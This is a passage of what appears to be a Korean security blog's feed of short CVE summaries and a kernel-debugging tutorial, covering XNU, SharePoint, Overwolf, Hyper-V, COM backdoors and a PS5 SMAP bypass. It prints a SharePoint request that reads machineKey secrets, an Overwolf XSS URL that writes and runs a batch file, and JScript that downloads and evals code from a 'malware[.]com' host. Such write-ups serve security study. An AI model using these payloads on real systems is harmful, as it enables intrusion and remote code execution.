&#123;msgsz = msghdr-&gt;msg_ts;&#125;</code></pre><p>이후 아래의 반복문을 돌며 커널 <code>msgpool</code>의 데이터를 유저 공간으로 복사합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-comment">// msg.h</span><span class="hljs-number">2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGSSZ8<span class="hljs-comment">/* Each segment must be 2^N long */</span></span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">msginit</span><span class="hljs-params">(__unused <span class="hljs-keyword">void</span> *dummy)</span></span>&#123;<span class="hljs-number">5</span><span class="hljs-keyword">if</span> (i != msginfo.msgssz) &#123;<span class="hljs-number">6</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;msginfo.msgssz=%d (0x%x) not a small power of 2; resetting to %d\\n&quot;</span>, msginfo.msgssz, msginfo.msgssz, MSGSSZ); <span class="hljs-number">7</span>msginfo.msgssz = MSGSSZ;<span class="hljs-number">8</span>&#125;<span class="hljs-number">9</span>...<span class="hljs-number">10</span><span class="hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msgsnd_nocancel</span><span class="hljs-params">(struct proc *p, struct msgsnd_nocancel_args *uap, <span class="hljs-keyword">int32_t</span> *retval)</span></span>&#123;<span class="hljs-number">12</span>...<span class="hljs-number">13</span><span class="hljs-keyword">for</span> (len = <span class="hljs-number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;<span class="hljs-number">14</span><span class="hljs-keyword">size_t</span> tlen;<span class="hljs-number">15</span><span class="hljs-comment">/* compare input (size_t) value against restrict (int) value */</span><span class="hljs-number">16</span><span class="hljs-keyword">if</span> (msgsz &gt; (<span class="hljs-keyword">size_t</span>)msginfo.msgssz) &#123;<span class="hljs-number">17</span>tlen = msginfo.msgssz;<span class="hljs-number">18</span>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-number">19</span>tlen = msgsz;<span class="hljs-number">20</span>&#125;<span class="hljs-number">21</span><span class="hljs-keyword">if</span> (next &lt;= <span class="hljs-number">-1</span>) &#123;<span class="hljs-number">22</span>panic(<span class="hljs-string">&quot;next too low #3&quot;</span>);<span class="hljs-number">23</span>&#125;<span class="hljs-number">24</span><span class="hljs-keyword">if</span> (next &gt;= msginfo.msgseg) &#123;<span class="hljs-number">25</span>panic(<span class="hljs-string">&quot;next out of range #3&quot;</span>);<span class="hljs-number">26</span>&#125;<span class="hljs-number">27</span>SYSV_MSG_SUBSYS_UNLOCK();<span class="hljs-number">28</span>eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen);<span class="hljs-number">29</span>...</code></pre><p>반복문의 증가 값인 <code>msginfo.msgssz</code>는 <code>msginit()</code>에서 <code>#define MSGSSZ 8</code> 로 선언된 <code>MSGSSZ</code>로 초기화되어 특정 조건을 만족하면 <code>8 bytes</code> 단위로 커널 메모리를 유저 공간에 복사하는데, 이때 요청된 크기가 8의 배수가 아닐 경우 초기화되지 않은 <code>1~7 bytes</code> 크기의 커널 메모리가 유출될 수 있습니다.</p><p><code>9 bytes</code> 크기의 <code>SYS_msgsnd_nocancel</code> syscall을 보낼 경우 취약점은 다음과 같이 트리거 됩니다.</p><ol><li><code>msghdr→msg_ts</code>와 <code>msgsz</code>가 9로 설정됩니다.</li><li>line 16의 조건문에 의해  <code>tlen</code>이 8이 됩니다.</li><li><code> 8 bytes</code> 단위로 복사하는 반복문을 두 번 수행합니다.</li><li><code>16 bytes</code>의 커널 메모리가 유저 공간으로 복사되어 초기화되지 않은 <code>7 bytes</code> 크기의 커널 메모리가 유출됩니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>ios</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
      <tag>apple</tag>
      
      <tag>macos</tag>
      
      <tag>xnu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31181: Microsoft SharePoint 원격 코드 실행 취약점</title>
    <link href="/2021/06/03/idioth/2021-06-03/"/>
    <url>/2021/06/03/idioth/2021-06-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021년 5월 11일 릴리스 이전 버전의 Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint에서 인증된 사용자가 SharePoint의 웹 애플리케이션의 서비스 계정 context에서 임의 코드를 실행할 수 있는 취약점이 발견되어 5월에 패치되었습니다.</p><p>해당 취약점은 <code>EditingPageParser.VerifyControlOnSafeList()</code> 메소드에서 사용자 입력 값 검증 미흡으로 발생합니다. 이 메소드는 unsafe controls 리스트와 사용자의 입력 값을 비교하여 확인하며 <code>web.config</code>에 지정된 <code>SafeControl</code>에 의해 안전한 컨트롤이 없는 경우 예외를 발생시킵니다.</p><p>하지만 검사를 우회하는 방법이 존재합니다. <code>EditingPageParser.ParseStringInternal()</code>은 사용자 입력 값(<code>dscXml</code>)을 구문 분석하고 <code>hashtable</code>을 Register directive 정보로 채운 다음 서버 컨트롤을 나타내는 태그로 <code>hashtable2</code>를 채웁니다. 그 후 <code>hashtable2</code>의 각 요소에 대해 <code>Type</code> 객체를 생성하고 <code>SafeControls</code>의 allowed list와 비교하여 확인합니다. 하지만 <code>Type</code>을 확인할 수 없을 때 서버 컨트롤 태그가 무시됩니다. 이를 통해 <code>WebPartPagesWebService.RenderWebPartForEdit</code> 웹 API 메소드로 <code>/_vti_bin/webPartPages.asmx</code> 엔드포인트를 통해 접근할 수 있습니다. <code>aspx</code>를 입력 값으로 사용하여 <code>EditPageParser.VerifyControlOnSafeList</code>를 사용해 확인 후 unsafe element가 없으면 디자인 모드에서 마크업을 처리합니다. 이때 <code>RenderWebPartForEdit</code>의 request는 다음과 같습니다.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;6e7040c8-0338-4448-914d-a7061e0fc347&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>따라서 <code>web.config</code>의 machinekey section을 사용하여 서버에서 <code>ViewState</code>가 deserialize 될 때 임의의 OS 명령을 실행하는 <code>VIEWSTATE</code> 파라미터를 생성할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
    <link href="/2021/06/02/fabu1ous/2021-06-02/"/>
    <url>/2021/06/02/fabu1ous/2021-06-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf는 PC 게임을 위한 확장 프로그램의 개발 프래임워크를 제공하고 유통하는 플랫폼입니다. Overwolf Store의 URL handler에 Reflected Cross-Site Scripting(XSS)을 이용한 원격 코드 실행 취약점이 발견되었습니다. </p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre><p><code>overwolfstore://</code> Custum Scheme를 사용하면 웹브라우저를 통해 OverwolfAppstore.exe 프로세스를 실행할 수 있습니다. URL의 category에 해당하는 부분이 오류 메세지의 일부로 responce body에 reflect 되며 Overwolf Store UI의 DOM에 reflect 되므로 XSS 공격이 가능합니다.</p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre><p>위는 PoC 코드로 다음과 같은 작업을 합니다.</p><ol><li>누군가 악성 URL에 접속하면 Overwolf Store 응용프로그램이 실행되고 XSS 취약점 트리거.</li><li><code>C:\windows\temp\</code> 폴더에 악성 batch 파일 생성.</li><li>batch 파일 실행</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28476: Microsoft Hyper-V의 Guest-to-Host RCE 취약점</title>
    <link href="/2021/06/01/l0ch/2021-06-01/"/>
    <url>/2021/06/01/l0ch/2021-06-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host “Microsoft Hyper-V Remote Code Execution Vulnerability” in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 하이퍼바이저 기반 가상화 시스템인 Hyper-V에서 게스트 머신이 호스트 머신으로 escape 해 원격 코드 실행이 가능한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 호스트 머신의 <code>vmswitch.sys</code> 드라이버에 존재합니다. <code>vmswitch.sys</code>는 가상 파티션이 존재하는 시스템에서 파티션 간 통신에 사용되는 채널 기반 통신 메커니즘인 <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> 기능을 지원합니다. <code>vmswitch.sys</code>의 <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> 함수에서는 원격 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  요청을 처리하는데, 게스트 머신에서 악성 RNDIS 요청을 보내 해커가 제어하는 데이터로 호출이 가능하고 이를 이용해 호스트 머신이 게스트 머신의 포인터를 역참조 하도록 합니다.</p><p>해커는 Hyper-V에 Ubuntu focal 게스트 머신을 생성한 뒤 해당 취약점을 악용해 원격 코드 실행을 트리거할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>L0ch</tag>
      
      <tag>hyper-v</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] COM 객체를 활용한 백도어</title>
    <link href="/2021/05/31/idioth/2021-05-31/"/>
    <url>/2021/05/31/idioth/2021-05-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 몇 년간, 해커들은 COM Object을 통해 fileless attack, defense 우회, 화이트리스트를 우회하고 RPC 프로토콜을 사용하여 내부에 침투하기도 했습니다. 해커들이 COM 객체를 통해 공격을 진행하는 방법은 다음과 같습니다.</p><p>먼저 Initial Access를 위한 COM 객체를 생성합니다. 내부 네트워크에 접근하기 위해서 페이로드를 전송할 수 있어야 합니다. COM Scriptlet을 통해 악성 자바스크립트나 VBScript를 다운로드하고 실행할 수 있습니다.</p><p>COM을 활용하여 악성 스크립트를 다운로드하고 실행하는 Scriptlet 코드는 다음과 같이 구성됩니다. 첫번째로 Shell에 접근합니다.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>를 통해 <code>WScript.Shell</code>을 호출하여 명령을 실행할 수 있습니다.  그 다음 네트워크 통신을 통해 악성 스크립트 파일을 다운로드하고 실행합니다.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NET의 Serialization을 활용하여 위의 작업을 수행할 수 있습니다. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>를 <code>ActiveXObject</code>로 호출하면 객체를 base64로 인코딩할 수 있고 메모리에서 디코딩되어 메인 코드를 실행할 수 있습니다. 이는 <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>를 통해 쉽게 활용할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>com</tag>
      
      <tag>vbscript</tag>
      
      <tag>jscript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 1 - Setting Up Kernel Debugging</title>
    <link href="/2021/05/30/l0ch/windows-driver/"/>
    <url>/2021/05/30/l0ch/windows-driver/</url>
    
    <content type="html"><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요! L0ch입니다. 지난번 pwn cool sexy 시리즈에 이어 새로운 시리즈로 돌아왔습니다!  그 사이에 기말고사 기간이 된 건 덤.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>과거의 나야.. 너 기말도 망했어</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>교수님 종강좀요ㅠㅠㅠ</p><p>이번 시리즈에서는 하루한줄을 보다 보면 꽤 자주 나오는 Windows third-party driver의 권한상승 취약점을 다룰 예정입니다! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>이 드라이버 아님ㅎㅎ;</p></blockquote><p>예시를 하나 들어보자면.. 최근 이슈가 된 Dell의 BIOS 업데이트에 사용되는 드라이버에서 나온 <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점 </a> 정도가 있겠네요. 대충 심각한 취약점인건 알겠는데 IOCTL은 뭐고… <code>EPROCESS</code>? 토큰을 어떻게 덮어 쓴다는 건지 또 권한상승은 어떻게 한다는 건지.. 정말 모르는 용어, 개념 투성이네요. 공부할게 너무 많지만 ㅠㅠㅠ 하나씩 공부하다보면 언젠가는 드라이버 취약점을 찾을수도 있겠죠?</p><p>오늘은 시리즈 첫 글이니 가볍게 디버깅 환경 세팅으로 시작해서 앞으로 간단한 exploit 예제를 다루고, one-day 분석하는 것을 끝으로 마무리하려고 합니다. 이번 시리즈도 길어질 것 같은 예감이 드는 건.. 기분 탓인가..?</p><h1 id="준비"><a href="#준비" class="headerlink" title="준비"></a>준비</h1><p>우선 디버깅 세팅부터 해야 합니다. 커널 디버깅은 유저 모드 애플리케이션과 달리 로컬에서 디버깅할 수 없습니다. 완전히 불가능한 것은 아니지만 제약사항이 많죠. 그래서! 보통은 원격지 PC를 하나 구성해 디버거를 세팅합니다.</p><p>이전에는 named pipe를 사용해 가상 시리얼 포트로 커널 디버깅을 했지만 시리얼 포트 속도의 한계로 KDNET 네트워크 디버깅을 사용하며 필요한 준비는 아래와 같습니다.</p><p><strong>1. 호스트 Windows와 VMware or Hyper-V의 게스트 Windows</strong></p><p>Windbg를 사용해 커널을 분석할 것이기 때문에 분석대상이 되는 디버기 Windows와 분석을 진행할 Windows가 각각 필요합니다. 호스트가 Windows 환경이면 게스트 Windows VM 하나만 올리면 됩니다. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>네 저는 맥을 사용하기 때문에…..  Windows VM 두개를 올려서 진행했습니다. </p><p>네? 어디서 뭐가 돌아가는 소리 안나냐구요?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>이륙한드아아ㅏㅏ !!!</p></blockquote><p>맥이 잘 버텨주고 있으니 다행이네요 ㅎㅎ 아님말고<br>글에서는 편의상 호스트 OS가 Windows라고 가정하고 분석할 디버기 Windows를 게스트라고 부르겠습니다! </p><p><strong>2. 블루스크린을 친구처럼 생각하는 강인한 멘탈(?)</strong></p><p>사실 취약점 찾는 입장에서 블루스크린은 곧 크래시기 때문에 블루스크린을 본다면 개이득이죠ㅋㅋ  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>편안-</p></blockquote><p>멘탈까지 준비가 모두 되었다? 바로 디버깅 세팅으로 고고고</p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>먼저 게스트와 호스트 Windows에 <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>를 설치합니다. 호스트 Windows에는 Windbg Preview를 설치해 사용해도 되지만 Windbg Preview는 kdnet이 없기 때문에 게스트 Windows에는 Windbg를 SDK로 설치해야 합니다!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg 설치를 끝냈으면 게스트 VM 설정→Network Adapter에서 Network connection을 Bridged로 설정해 호스트와 통신할 수 있게 설정한 뒤 통신이 잘 되는지 테스트를 해봅니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>핑 테스트 할 때는 호스트와 게스트 모두 방화벽에서 ICMP 인바운드 허용하는 것 잊지 마세요!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>정상적으로 통신이 되는 걸 확인했으면 호스트의 host name을 확인합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>게스트에서 cmd를 관리자 권한으로 실행해 다음과 같이 <code>kdnet.exe</code>을 실행합니다. 이때 포트는 50000 ~ 50039 범위 안에서 줍니다.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>해당 머신을 디버깅하기 위해 커맨드를 호스트 머신에서 실행하라고 하네요! 빨간 박스의 커맨드를 복사해놓습니다.</p><p>이제 호스트의 Windbg Preview를 실행하고 Start debugging → Attach to Kernel → Net 에서 포트와 커맨드를 입력합니다.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OK를 눌러 Windbg Preview가 대기 상태가 되면 게스트를 <code>shutdown -r -t 0</code> 으로 재부팅해줍니다. </p><p>재부팅하면..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>잘 붙은 것 같죠? 디버기 머신인 게스트 Windows도 확인해볼게요.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>디버거가 붙은 상태에서 부팅되면 우측 하단에 테스트 모드와 빌드 버전 정보가 표시되는 것을 확인할 수 있습니다. </p><p>다음 파트부터는 본격적으로 Windows의 third-party driver와 취약점, one-day 분석까지 알아보도록 하겠습니다 ㅎㅎ</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>debugging</tag>
      
      <tag>kernel debugging</tag>
      
      <tag>third-party driver exploitation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
    <link href="/2021/05/30/j0ker/2021-05-30/"/>
    <url>/2021/05/30/j0ker/2021-05-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)은 커널에서 유저랜드 메모리에 접근하지 못하게 하여 취약점 익스플로잇을 어렵게 하는 커널 레벨 보호기법입니다.</p><p>PlayStation 5(이하 PS5)는 FreeBSD 12 기반으로 개발된 운영체제인 Orbis 2.0을 사용합니다. CVE-2021-29628은 FreeBSD 12에서 발견됐었던 취약점이지만, PS5에서 이 취약점에 대해 패치를 하지 않아 PS5에서 SMAP를 bypass할 수 있었습니다.</p><p>PS5에서 SMAP가 활성화되어 있는 상태(<code>Rflags</code>의 <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>가 세팅되지 않은 상태)에서 커널에서 유저 페이지에 접근하면 page fault가 발생합니다. 반면에 <code>%RFLAGS.AC</code>가 세팅되지 않은 상태에서는 커널에서 정상적으로 유저 페이지에 접근이 가능합니다. 하지만 FreeBSD 커널에서는 <code>copyin()</code>과 <code>copyout()</code> 함수들을 통해 <code>%RFLAGS.AC</code>를 잠시 세팅해서 유저 페이지에 접근합니다.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> 함수가 실행되면 fault handler인 <code>copy_fault()</code> 함수를 handler로 등록한 후 <code>%RFLAGS.AC</code>를 세팅해 복사 작업을 진행합니다. 그리고 복사 작업이 끝나면 다시 <code>%RFLAGS.AC</code>를 클리어합니다. 이 때, 복사 과정에서 fault가 발생하면 <code>trap()</code>함수가 실행됩니다.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> 함수에서는 <code>curpcb-&gt;pcb_onfault</code>에 값이 들어가 있으면 이 안에 값을 <code>fram→tf_rip</code>에 넣고 바로 return 하는데, 이 때 <code>%RFLAGS.AC</code>를 클리어하지 않아 SMAP이 비활성화인 상태로 핸들링을 마무리합니다. 따라서 이를 통해 SMAP를 bypass하여 이 이후의 syscall들을 SMAP이 비활성화된 상태에서 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>j0ker</tag>
      
      <tag>bypass</tag>
      
      <tag>smap</tag>
      
      <tag>freebsd</tag>
      
      <tag>playstation5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
    <link href="/2021/05/29/fabu1ous/2021-05-29/"/>
    <url>/2021/05/29/fabu1ous/2021-05-29/</url>
    
